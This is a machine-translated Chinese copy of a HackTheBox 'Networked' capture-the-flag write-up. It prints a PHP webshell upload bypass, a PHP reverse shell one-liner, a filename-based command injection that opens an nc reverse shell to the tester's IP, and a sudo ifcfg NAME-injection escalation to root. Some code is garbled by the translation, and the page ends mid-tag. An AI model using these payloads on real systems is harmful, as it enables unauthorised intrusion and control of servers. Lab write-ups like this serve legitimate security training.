<html>
<head>
<title>HackTheBox — Networked Writeup (OSCP Like)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子——网络写作(OSCP喜欢)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-networked-writeup-3d0a1276ad3c?source=collection_archive---------4-----------------------#2022-11-08">https://infosecwriteups.com/hackthebox-networked-writeup-3d0a1276ad3c?source=collection_archive---------4-----------------------#2022-11-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/194499910574117df8da41fbf3fd5af2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jpuaYec-l36X-gnvotbjXw.png"/></div></div></figure><p id="1e2e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">联网是一个中等水平的OSCP，就像黑客盒子上的linux机器。具有挑战性的部分是读取代码以便利用它来获取shell，还有特权提升部分，这是不寻常和不常见的。</p><h2 id="91c1" class="kw kx iq bd ky kz la dn lb lc ld dp le kj lf lg lh kn li lj lk kr ll lm ln lo bi translated">列举</h2><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lp"><img src="../Images/e490b65b46ac427c2ff8d03cca5810ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DOwIZJ9v1OC5-z2lj3sjKA.png"/></div></div></figure><p id="2811" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们发现端口22和80是开放的。这是默认页面</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi lu"><img src="../Images/a6dd4ecfd273bb45b3eea3dcae5b258e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/1*zvXMnbTwwzC851MWkROxPg.png"/></div></figure><p id="7425" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们使用目录搜索在端口80托管的网页中查找目录。我们找到/上传和/备份</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lv"><img src="../Images/a7c34ebf98cb06edb301c54aab37eb19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kppkOWQoO4y-NMvLAkotVA.png"/></div></div></figure><p id="d284" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们访问备份</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/793404a8f3a3c96134084855280013fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1318/format:webp/1*JhHG3IOEk4PkT26DF1d-7Q.png"/></div></figure><p id="b040" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">好像是压缩的焦油文件。我们通过运行file命令来确认这一点。这是一个POSIX tar归档文件</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi lx"><img src="../Images/bbf1aea112306da536814565749ea4bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1346/format:webp/1*adSNubpW7_q8NuhM7jwZgA.png"/></div></figure><p id="411b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让谷歌如何解压缩焦油文件，我们发现这在stackoverflow</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ly"><img src="../Images/27dbcf9a6c830e45601d0f1b7897a5ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zNzwTzYbZQc4Eko061kcaQ.png"/></div></div></figure><p id="e1d9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">命令→<strong class="ka ir">tar xvf filename.tar</strong></p><p id="e5b9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">一旦你打开备份文件，你会发现3-4个文件夹，主要是页面的源代码。让我们参观photos.php</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lz"><img src="../Images/92a0ff27e3275f4d782b426a4e6b1bdf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z4I7Y-CzzpwZ2D7rwWPqIQ.png"/></div></div></figure><p id="5e0a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们访问upload.php，看起来我们可以在这里上传文件，并希望做一些文件上传旁路和执行命令。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ma"><img src="../Images/a5dc885d7b85dffad433ec021fafc8c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oIgb6XDiNfSXVFOCamBO0A.png"/></div></div></figure><p id="bd7f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在上传任何恶意的东西之前，我试着上传一个简单的图像文件</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/524ecc1d3173797fc0c3296d3f738853.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*QKX3G3QDtL-OHBwKXgVruw.png"/></div></figure><p id="8955" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当我去photos.php的时候，我终于可以看到我上传的照片了</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mc"><img src="../Images/8ce57fc9e6457a6dca59fe65fe106960.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VTuUEumTRJJpzmyEeUSRdg.png"/></div></div></figure><p id="b0aa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我右击图片，在一个新的标签中打开它，并且能够找到它的位置。好像是上传到了/uploads文件夹</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi md"><img src="../Images/161d0dfcd714c9a3e67fb4d193cdd375.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zcm2BXp4AD-OYnTpL4Dd2Q.png"/></div></div></figure><p id="6f04" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们尝试一些文件上传旁路！。我尝试了许多方法，其中一个是用. png.php扩展名保存反向shell，欺骗web服务器，使其认为这是一个png(图像)文件，但随后以php执行，因为它以。服务器端编程语言（Professional Hypertext Preprocessor的缩写）</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi me"><img src="../Images/51b34a62ce39cf682d42872af9f30e98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/format:webp/1*dC_M1CFqGNb2oauA4HLfCg.png"/></div></figure><p id="56c8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">额外提示:如果你阅读upload.php文件的内容，你可以看到哪些扩展名是允许的。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mf"><img src="../Images/687302551979414e5e88141ed22792aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KBJO5eUbznrzTEnjs3iMfQ.png"/></div></div></figure><p id="f5f5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">不管怎样，让我们截取burp中的请求，并将请求发送给中继器。在请求的主体中，您将看到一些grabage值，这是图像的数据。我们不会删除它，因为它欺骗目标认为我们实际上是在上传图像。现在转到最后一行，添加一段php代码。</p><p id="429f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> &lt;？php系统($ _ GET[' cmd '])；？&gt; </strong></p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mg"><img src="../Images/737083d972f1635f1808e19f83520dbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HoetCS-7nplIS0wXUOPE6w.png"/></div></div></figure><p id="c079" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">您可以看到我们的文件已成功上传</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mh"><img src="../Images/bb82495f2833825f41ba0baedddcf231.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DfKgAhGmjaiCJHPsc3-dig.png"/></div></div></figure><p id="6668" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">除此之外，确保用扩展名. png.php保存文件名，如您在第15行看到的。这将作为php执行我们的文件。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mi"><img src="../Images/5e419cd23ad46ce450e402daec5fbe89.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WyO8AjZSg4FiJOQV1KwKZg.png"/></div></div><figcaption class="mj mk gj gh gi ml mm bd b be z dk translated">见第15行filename=poison.php.jpg</figcaption></figure><p id="1d38" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们访问photos.php，右键单击我们的图像，并在一个新的标签中打开它</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/61c27b04963661e60ebd280fe5835709.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Jc-3C5PMHjq-Qtmns4090w.png"/></div></div></figure><p id="0862" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们能够看到图像中的数据。这些是垃圾值</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/6af5d8dc9346b9692c311f9193e0b633.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*chGZTrvNNWysI9Z-YKIyiw.png"/></div></div></figure><p id="054e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">额外提示:我们本可以避免这些垃圾。我们可以不在php代码前保存图像数据，而是直接放入任何像GIF87a这样的神奇字节，让目标误以为我们在上传GIF文件。我会给你看一个我的意思的图像</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/aa0304cb39e1851bad76d5ddb1f0a335.png" data-original-src="https://miro.medium.com/v2/resize:fit:1388/format:webp/0*tGLR7hkm5y8vK0cM.png"/></div><figcaption class="mj mk gj gh gi ml mm bd b be z dk translated">GIF87a是GIF的神奇字节。幻字节是帮助系统识别文件类型的字节。只要谷歌gif的魔法字节</figcaption></figure><p id="5ea0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在url中，我们使用？cmd=whoami这将运行whoami命令</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/bccf03dd65a6facc965b8b0eaf63012c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P2m-ePlxsboiGmQ_B920Pw.png"/></div></div></figure><p id="c660" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在向下滚动，您会看到apache，它以蓝色突出显示。所以我们是apache用户。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/90d82375215e048e4c764227bdfe2b71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Kik_Ziqf2W_U5-2yEoHegg.png"/></div></div></figure><p id="45b0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们把whoami命令替换成更恶意的东西，比如php反向shell</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/5019ecc41bc2f53afbb778e875c3c7b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GxPeSedYTEGMyCqWma7oVA.png"/></div></div></figure><p id="e7b1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">PHP-r ' $ sock = fsockopen(" 10 . 0 . 0 . 1 "，1234)；exec("/bin/sh-I&lt;&amp;3&gt;&amp;3 2&gt;&amp;3 ")；'</strong></p><p id="03db" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">确保对它进行URL编码！(否则它不会工作)</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mt"><img src="../Images/54a51a440a9782315819dc8b35a33bbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tXmPg40urgisRMqN5NHeaA.png"/></div></div></figure><p id="b3d9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">？cmd= <paste your="" url="" encoded="" php="" reverse="" shell="" here=""/></p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mu"><img src="../Images/b1d33ac7a88dfe31f4f77462618a48a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cTYx3ZK5Uu_70My0iGiaEA.png"/></div></div></figure><p id="eb76" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们终于得到了一个贝壳。顺便说一下，我通过url做的事情也可以通过burpsuite来完成。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/2201d433fac74702added931a62e10e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1294/format:webp/1*-fCJkOydseIeNUY9oF1qzQ.png"/></div></figure><p id="f8e0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们将linpeas传输到目标</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/a74cddf392ee918310d601c3f4152010.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aO6lnxrI3xEtCUjaNP89CA.png"/></div></div></figure><h2 id="1a77" class="kw kx iq bd ky kz la dn lb lc ld dp le kj lf lg lh kn li lj lk kr ll lm ln lo bi translated">权限提升</h2><p id="f619" class="pw-post-body-paragraph jy jz iq ka b kb mx kd ke kf my kh ki kj mz kl km kn na kp kq kr nb kt ku kv ij bi translated"><strong class="ka ir">概述- </strong>现在这部分要求你知道如何阅读代码。不幸的是，我没有多少阅读php代码的经验。我强烈建议你参考ippsec的视频。我将为这一部分提供的解释摘自Rana khalil的文章，其中有很好的解释。(Credits-<a class="ae nc" href="https://ranakhalil101.medium.com/hack-the-box-networked-writeup-w-o-metasploit-62daa1146b9b" rel="noopener">https://ranakhalil 101 . medium . com/hack-the-box-networked-writeup-w-o-metasploit-62 DAA 1146 b9b</a>)</p><h2 id="56af" class="kw kx iq bd ky kz la dn lb lc ld dp le kj lf lg lh kn li lj lk kr ll lm ln lo bi translated">阿帕奇&gt;古利</h2><p id="252a" class="pw-post-body-paragraph jy jz iq ka b kb mx kd ke kf my kh ki kj mz kl km kn na kp kq kr nb kt ku kv ij bi translated"><em class="nd"> user.txt </em>标志位于用户<em class="nd"> guly </em>的主目录中。所以我们要么将我们的特权升级到红色的，要么升级到根。</p><p id="e653" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我运行了<em class="nd"> LinEnum.sh </em>和<em class="nd"> pspy64 </em>程序，但没有发现任何异常。我注意到在guly的主目录中有一个php脚本和一个crontab文件。我们对它们都有读取权限。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="53fc" class="nj kx iq nf b be nk nl l nm nn">bash-4.2$ ls -la<br/>total 28<br/>drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .<br/>drwxr-xr-x. 3 root root  18 Jul  2  2019 ..<br/>lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -&gt; /dev/null<br/>-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout<br/>-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile<br/>-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc<br/>-rw-------  1 guly guly 639 Jul  9  2019 .viminfo<br/>-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php<br/>-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly<br/>-r--------. 1 guly guly  33 Oct 30  2018 user.txt</span></pre><p id="09bd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">查看crontab.guly的内容。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="bc1c" class="nj kx iq nf b be nk nl l nm nn">bash-4.2$ cat crontab.guly <br/>*/3 * * * * php /home/guly/check_attack.php</span></pre><p id="45ae" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它每3分钟运行一次<em class="nd">文件check_attack.php </em>脚本。如果你不熟悉crontab格式，请参考下面的<a class="ae nc" href="https://www.netiq.com/documentation/cloud-manager-2-5/ncm-reference/data/bexyssf.html" rel="noopener ugc nofollow" target="_blank">链接</a>。</p><p id="f680" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们来查看一下<em class="nd"> check_attack.php </em>文件。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="8066" class="nj kx iq nf b be nk nl l nm nn">&lt;?php<br/>require '/var/www/html/lib.php';<br/>$path = '/var/www/html/uploads/';<br/>$logpath = '/tmp/attack.log';<br/>$to = 'guly';<br/>$msg= '';<br/>$headers = "X-Mailer: check_attack.php\r\n";$files = array();<br/>$files = preg_grep('/^([^.])/', scandir($path));foreach ($files as $key =&gt; $value) {<br/>        $msg='';<br/>  if ($value == 'index.html') {<br/>        continue;<br/>  }<br/>  #echo "-------------\n";#print "check: $value\n";<br/>  list ($name,$ext) = getnameCheck($value);<br/>  $check = check_ip($name,$value);if (!($check[0])) {<br/>    echo "attack!\n";<br/>    # todo: attach file<br/>    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);exec("rm -f $logpath");<br/>    exec("nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;");<br/>    echo "rm -f $path$value\n";<br/>    mail($to, $msg, $msg, $headers, "-F$value");<br/>  }<br/>}?&gt;</span></pre><p id="7334" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">该脚本接收/var/www/html/uploads目录中的所有文件，并从lib.php文件中对其运行<em class="nd"> getnameCheck() </em>和<em class="nd"> check_ip() </em>函数。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="ea99" class="nj kx iq nf b be nk nl l nm nn">function getnameCheck($filename) {<br/>  $pieces = explode('.',$filename);<br/>  $name= array_shift($pieces);<br/>  $name = str_replace('_','.',$name);<br/>  $ext = implode('.',$pieces);<br/>  #echo "name $name - ext $ext\n";<br/>  return array($name,$ext);<br/>}function check_ip($prefix,$filename) {<br/>  //echo "prefix: $prefix - fname: $filename&lt;br&gt;\n";<br/>  $ret = true;<br/>  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {<br/>    $ret = false;<br/>    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";<br/>  } else {<br/>    $msg = $filename;<br/>  }<br/>  return array($ret,$msg);<br/>}</span></pre><p id="cbb9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><em class="nd"> getnameCheck() </em>函数简单地将文件的名称与扩展名分开。函数的作用是:检查文件名是否是一个有效的ip地址。如果不是，它将返回false，这将触发<em class="nd"> check_attack.php </em>文件中的攻击组件。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="11f2" class="nj kx iq nf b be nk nl l nm nn">if (!($check[0])) {<br/>    echo "attack!\n";<br/>    # todo: attach file<br/>    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);exec("rm -f $logpath");<br/>    exec("nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;");<br/>    echo "rm -f $path$value\n";<br/>    mail($to, $msg, $msg, $headers, "-F$value");<br/>  }</span></pre><p id="eda7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这会将文件的路径传递给exec()函数并删除它。当然，没有对exec()函数的输入进行验证，因此我们可以滥用它来提升特权。</p><p id="c48e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">转到<strong class="ka ir"> /var/www/html/uploads </strong>目录并创建以下文件。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="d1ca" class="nj kx iq nf b be nk nl l nm nn">touch '; nc -c bash 10.10.14.12 3333'</span></pre><p id="abff" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">“；”将结束exec()函数中的“rm”命令，并运行nc命令，这将向我们的机器发送一个反向shell。</p><p id="9e62" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">设置一个侦听器来接收反向shell。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="0455" class="nj kx iq nf b be nk nl l nm nn">nc -nlvp 3333</span></pre><p id="bbfb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">等待cron作业运行，我们得到一个shell！</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/acf4844da92c7a69f4f0e4f0345cb65a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Re_n_9gl_aBZ2zMR.png"/></div></div></figure><p id="705a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">将shell转换为完全交互式的shell，并获取user.txt标志。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/1b1fa75e1f7241a78af8b585c8892b52.png" data-original-src="https://miro.medium.com/v2/resize:fit:902/format:webp/0*ohg-Xk44BZt3em8i.png"/></div></figure><h2 id="8420" class="kw kx iq bd ky kz la dn lb lc ld dp le kj lf lg lh kn li lj lk kr ll lm ln lo bi translated">古利&gt; Root (ifcfg权限提升)</h2><p id="f0f4" class="pw-post-body-paragraph jy jz iq ka b kb mx kd ke kf my kh ki kj mz kl km kn na kp kq kr nb kt ku kv ij bi translated">我们需要将我们的权限提升到root。我下载了<em class="nd"> LinEnum </em>脚本并运行它。看起来我们可以在没有密码的情况下以root用户身份运行下面的文件。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="9214" class="nj kx iq nf b be nk nl l nm nn">User guly may run the following commands on networked:<br/>    (root) NOPASSWD: /usr/local/sbin/changename.sh[+] Possible sudo pwnage!<br/>/usr/local/sbin/changename.sh</span></pre><p id="0cfe" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">查看文件的权限。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="02b6" class="nj kx iq nf b be nk nl l nm nn">[guly@networked ~]$ ls -la /usr/local/sbin | grep changename.sh<br/>-rwxr-xr-x   1 root root 422 Jul  8  2019 changename.sh</span></pre><p id="3a6f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们只有文件的读取和执行权限。让我们来查看文件的内容。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="026d" class="nj kx iq nf b be nk nl l nm nn">#!/bin/bash -p<br/>cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF<br/>DEVICE=guly0<br/>ONBOOT=no<br/>NM_CONTROLLED=no<br/>EoFregexp="^[a-zA-Z0-9_\ /-]+$"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do<br/>        echo "interface $var:"<br/>        read x<br/>        while [[ ! $x =~ $regexp ]]; do<br/>                echo "wrong input, try again"<br/>                echo "interface $var:"<br/>                read x<br/>        done<br/>        echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly<br/>done<br/>  <br/>/sbin/ifup guly0</span></pre><p id="7357" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它接受文件<em class="nd"> ifcfg-guly </em>的内容，并对输入进行简单的正则表达式检查。让我们查看该文件的权限。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="1308" class="nj kx iq nf b be nk nl l nm nn">[guly@networked ~]$ ls -la /etc/sysconfig/network-scripts/ | grep ifcfg-guly<br/>-rw-r--r--  1 root root   114 Jan 14 04:09 ifcfg-guly</span></pre><p id="e664" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们只能看。我们来看看文件。</p><pre class="lq lr ls lt gt ne nf ng bn nh ni bi"><span id="c9ed" class="nj kx iq nf b be nk nl l nm nn">DEVICE=guly0<br/>ONBOOT=no<br/>NM_CONTROLLED=no<br/>NAME=ps /tmp/foo<br/>PROXY_METHOD=asodih<br/>BROWSER_ONLY=asdoih<br/>BOOTPROTO=asdoih</span></pre><p id="a21f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">该名称被分配了一个系统命令，因此我们可以使用它来提升权限。经过一番谷歌搜索，我发现了这个<a class="ae nc" href="https://bugzilla.redhat.com/show_bug.cgi?id=1697473" rel="noopener ugc nofollow" target="_blank">错误报告</a>，报告称NAME属性上不正确的空格过滤会导致代码执行。由于我们可以使用sudo权限运行changename.sh脚本，它将提示我们输入名称值，并且由于它没有得到正确的验证，我们可以使用root权限获得一个shell！这里有更多关于ifcfg特权提升的资源。这是一个非常隐晦的方法。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nq"><img src="../Images/e0f05aad8fb8fa99f000d27814223371.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LlETt_9JiW7qjpETfxh_fA.png"/></div></div></figure><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/32e98365e7d253e985ff8e8970aa0973.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8yjj7et-fU6R_BWeLiL9Cw.png"/></div></div></figure><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img 